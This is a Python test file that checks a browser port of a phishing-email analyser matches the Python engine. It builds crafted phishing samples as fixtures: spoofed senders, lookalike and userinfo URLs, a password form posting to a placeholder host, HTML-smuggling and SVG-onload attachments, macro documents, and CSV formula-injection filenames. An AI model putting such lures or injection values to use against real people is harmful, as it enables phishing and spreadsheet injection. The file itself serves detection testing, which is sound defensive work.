"""The browser analyser (dashboard/core*.js) must produce byte-identical results to the Python engine."""
import json
import shutil
import subprocess

import pytest

from phishanalyzer.analyzer import analyze_message
from phishanalyzer.synthbuild import Att, build_eml, exe_stub, make_zip
from .conftest import ROOT, STD

pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")


def js_results(cfg, dns, messages):
    pub = {k: v for k, v in cfg.items() if not k.startswith("_")}
    job = {"cfg": pub, "dns": dns, "messages": [{"id": i, "raw": raw.decode("ascii")} for i, raw in messages]}
    p = subprocess.run(["node", str(ROOT / "scripts" / "parity_dump.js")], input=json.dumps(job), capture_output=True, text=True, timeout=120)
    assert p.returncode == 0, p.stderr
    return json.loads(p.stdout)


# "engine" is deliberately "<version> (browser port)" in JS; parse_defects (Python email-parser notes) is not reproduced in the browser.
PY_ONLY = {"engine", "parse_defects"}


def compare(cfg, dns, messages):
    js = js_results(cfg, dns, messages)
    for (label, raw), j in zip(messages, js):
        py = json.loads(json.dumps(analyze_message(raw, cfg, dns, label)))
        for a in py["attachments"] + j["attachments"]:
            a.pop("md5"), a.pop("sha1")      # the browser port only computes SHA-256 (md5/sha1 are empty there)
        diff = [k for k in py if k not in PY_ONLY and py[k] != j.get(k)]
        assert diff == [], (label, diff)
        assert j["engine"].endswith("(browser port)")


def test_whole_corpus_is_identical(corpus, cfg, dns):
    compare(cfg, dns, [(e["id"], e["bytes"]) for e in corpus])


def crafted():
    base = list(STD)
    out = []
    out.append(("header-only", b"From: Eve <eve@example.net>\nSubject: Urgent: verify your password now\nReply-To: x@example.org\n\n"))
    out.append(("lf-endings", b"From: A <a@example.com>\nTo: b@example.net\nSubject: hi\nDate: Mon, 02 Mar 2026 10:00:00 +0000\n\nPlease see http://192.0.2.9/login and https://bit.ly/abc\n"))
    out.append(("ipv6-received", build_eml(base + [("Received", "from mail.example.org (mail.example.org [IPv6:2001:db8::1]) by mx.example.com with ESMTP id 1; Mon, 02 Mar 2026 10:00:01 +0000"),
                                                    ("Authentication-Results", "mx.example.com; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com")], "ok\n")))
    out.append(("html-mismatch", build_eml(base, None, '<p>Sign in to <a href="https://evil.example.test/a?next=https://example.com">https://paypal.com/login</a></p>')))
    out.append(("zip-exe", build_eml(base, "see attached\n", None, [Att("scan.zip", make_zip([("a.pdf.exe", exe_stub("x"))]), "application/zip")])))
    out.append(("empty-body", b"Subject: x\n\n"))
    out.append(("encoded-subject", b"From: =?utf-8?B?VGVzdCDDqQ==?= <t@example.com>\nSubject: =?utf-8?Q?caf=C3=A9_urgent?=\n\nbody\n"))
    out.append(("userinfo-url", build_eml(base, "Go to https://paypal.com@evil.example.test/x now\n")))
    out.extend(crafted_attachments())
    return out


def crafted_attachments():
    from .test_attachments import OLE
    from phishanalyzer.synthbuild import make_ooxml, pdf_clean, png_tiny, zipcrypto_zip
    cases = {
        "att-exe-double": [Att("Invoice.pdf.exe", exe_stub("P05")), Att("report\u202efdp.exe", exe_stub("x"))],
        "att-mismatch": [Att("invoice.pdf", exe_stub("x")), Att("photo.png", pdf_clean()), Att("notes.txt", b"<html><script>x</script></html>"), Att("readme", b"MZ\x90\x00")],
        "att-macro": [Att("a.docm", make_ooxml("word", True)), Att("old.doc", OLE + b"_VBA_PROJECT"), Att("renamed.docx", make_ooxml("word", True)), Att("clean.docx", make_ooxml("word", False))],
        "att-archives": [Att("scan.zip", make_zip([("a.pdf.scr", exe_stub("a")), ("r.txt", b"hi")])), Att("s.zip", zipcrypto_zip([("a.exe", exe_stub("a"))], "pw")), Att("a.rar", b"Rar!\x1a\x07\x00"), Att("t.zip", b"PK\x03\x04junk")],
        "att-html": [Att("remit.html", b"<html><script>var b=new Blob([atob('QUJD')]);URL.createObjectURL(b);a.download='x';a.click();</script></html>"),
                     Att("f.htm", b"<html><form action='https://evil.example.test/p'><input type=password></form></html>"), Att("i.svg", b"<svg xmlns='x' onload='go()'></svg>")],
        "att-pdf-misc": [Att("a.pdf", b"%PDF-1.4\n<</OpenAction 1 0 R/JS (x)>>"), Att("logo.png", png_tiny(), "image/png"), Att("run.sh", b"#!/bin/sh\nid\n")],
    }
    out = [(k, build_eml(list(STD), "The password is: records2026\n", None, v)) for k, v in cases.items()]
    return out


def test_crafted_edge_cases_are_identical(cfg, dns):
    compare(cfg, dns, crafted())


def crafted_headers_urls_auth():
    D = "Mon, 02 Mar 2026 10:00:00 +0000"
    R = "from mail.example.org (mail.example.org [198.51.100.%d]) by mx.example.net with ESMTP id %d; %s"
    base = lambda frm, *extra: [("From", frm), ("To", "you@example.net"), ("Subject", "hi"), ("Date", D), ("Message-ID", "<1@example.com>")] + list(extra)
    cases = {
        "h-replyto": base("Sam <sam@example.com>", ("Reply-To", "x@other.example"), ("Return-Path", "<bounce@third.example>")),
        "h-display-brand": base('"PayPal Support" <help@freemail.example>'),
        "h-display-exec": base('"Priya Raman (CEO)" <priya@evil.test>'),
        "h-display-email": base('"ceo@northwind-analytics.example" <attacker@evil.test>'),
        "h-lookalike": base("PayPal <a@paypa1.test>", ("Reply-To", "x@micr0soft-support.test")),
        "h-token-brand": base("x <a@secure-paypal-login.test>"),
        "h-token-typo": base("x <a@secure-paypall-login.test>"),
        "h-msgid": [("From", "a@example.com"), ("Date", D), ("Message-ID", "<abc@localhost.localdomain>")],
        "h-msgid-missing": [("From", "a@example.com"), ("Date", D)],
        "h-msgid-unrelated": base("a@example.com")[:-1] + [("Message-ID", "<abc@elsewhere.test>")],
        "h-dates": [("From", "a@example.com"), ("Date", "Wed, 04 Mar 2026 10:00:00 +0000"), ("Message-ID", "<1@example.com>"), ("Received", R % (1, 1, "Mon, 02 Mar 2026 10:00:03 +0000"))],
        "h-date-stale": [("From", "a@example.com"), ("Date", "Sat, 10 Jan 2026 10:00:00 +0000"), ("Message-ID", "<1@example.com>"), ("Received", R % (1, 1, "Mon, 02 Mar 2026 10:00:03 +0000"))],
        "h-date-bad": [("From", "a@example.com"), ("Date", "last week"), ("Message-ID", "<1@example.com>")],
        "h-hops": base("a@example.com") + [("Received", R % (3, 3, "Mon, 02 Mar 2026 09:00:00 +0000")), ("Received", R % (2, 2, "Mon, 02 Mar 2026 22:30:00 +0000")), ("Received", R % (1, 1, "Mon, 02 Mar 2026 09:30:00 +0000"))],
        "h-helo": base("a@example.com") + [("Received", "from mail.good.example (unknown [198.51.100.9]) by mx.example.net; Mon, 02 Mar 2026 10:00:00 +0000")],
        "a-fail": base("a@example.com", ("Authentication-Results", "mx; spf=fail smtp.mailfrom=example.com; dkim=fail header.d=example.com; dmarc=fail header.from=example.com")),
        "a-softfail-misaligned": base("a@example.com", ("Authentication-Results", "mx; spf=softfail smtp.mailfrom=example.com; dkim=pass header.d=mailer.example.net")),
        "a-received-spf": base("a@example.com", ("Received-SPF", "fail (x) envelope-from=sam@example.com")),
        "a-dkim-sig": base("a@example.com", ("DKIM-Signature", "v=1; a=rsa-sha256; d=Example.com; s=sel; b=abc")),
        "a-offline": base("a@vendor-pay.example") + [("Received", R % (77, 1, "Mon, 02 Mar 2026 10:00:03 +0000"))],
        "a-all-pass": base("a@example.com", ("List-Unsubscribe", "<mailto:u@example.com>"), ("Authentication-Results", "mx; spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com; dmarc=pass header.from=example.com")),
    }
    out = [(k, build_eml(h, "Urgent: verify your password within 24 hours. Dear customer\n")) for k, h in cases.items()]
    htmls = {
        "u-mixed": '<a href="https://paypa1.test/signin?next=https://x.test/">https://www.paypal.com/signin</a> <a href="https://bit.ly/a">x</a> <a href="http://192.0.2.9/login">y</a>',
        "u-idn": '<a href="https://xn--pypal-4ve.test/">go</a> <a href="https://xn--80ak6aa92e.test/">go</a> <a href="https://xn--mnchen-3ya.example/">ok</a>',
        "u-userinfo": '<a href="https://paypal.com@evil.test/login">paypal.com</a> <a href="http://3405803853/x">ip</a> <a href="http://[2001:db8::1]/x">v6</a>',
        "u-misc": '<a href="javascript:alert(1)">x</a><a href="mailto:a@example.com">m</a><a href="https://cheap.xyz/">t</a><a href="https://a.b.c.d.e.example.test/">deep</a><a href="https://paypal.com.evil.test/">sub</a><a href="https://secure-paypal-login.test/">tok</a>',
        "u-redirect": '<a href="https://good.test/r?next=https%3A%2F%2Fevil.test%2Fx">r</a><a href="https://good.test/r?color=https://evil.test/">c</a><a href="https://evil.test/secure/login?verify=1">l</a>',
    }
    out += [(k, build_eml(base("Sam <sam@example.com>"), None, v)) for k, v in htmls.items()]
    return out


def test_headers_urls_and_auth_edge_cases_are_identical(cfg, dns):
    compare(cfg, dns, crafted_headers_urls_auth())


def test_csv_export_is_identical_including_formula_neutralising(cfg, dns):
    from phishanalyzer.iocs import extract_iocs, to_csv
    hostile = build_eml(list(STD) + [("Reply-To", "x@evil.test")], "x\n", None, [Att("=HYPERLINK(x).exe", exe_stub("q")), Att("+evil, \"quoted\".exe", exe_stub("r"))])
    results = [analyze_message(hostile, cfg, dns, "hostile")]
    results[0]["iocs"] = extract_iocs(results[0])
    for r in results:
        r.setdefault("verdict", "suspicious")
    job = {"csv_results": results}
    p = subprocess.run(["node", str(ROOT / "scripts" / "parity_dump.js")], input=json.dumps(job), capture_output=True, text=True, timeout=60)
    assert p.returncode == 0, p.stderr
    assert json.loads(p.stdout) == to_csv(results)
    assert "'=HYPERLINK" in to_csv(results) and "'+evil" in to_csv(results)
